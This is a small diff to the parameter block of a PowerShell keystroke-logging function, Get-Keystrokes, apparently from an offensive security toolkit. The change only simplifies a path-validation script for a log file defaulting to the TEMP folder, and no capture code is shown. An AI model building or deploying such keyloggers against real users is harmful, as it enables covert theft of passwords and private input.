@@ -40,7 +40,7 @@ function Get-Keystrokes {
     [CmdletBinding()] 
     Param (
         [Parameter(Position = 0)]
-        [ValidateScript({(Test-Path (Resolve-Path (Split-Path -Parent -Path $_)) -PathType Container)})]
+        [ValidateScript({Test-Path (Resolve-Path (Split-Path -Parent -Path $_)) -PathType Container})]
         [String]$LogPath = "$($env:TEMP)\key.log",
 
         [Parameter(Position = 1)]
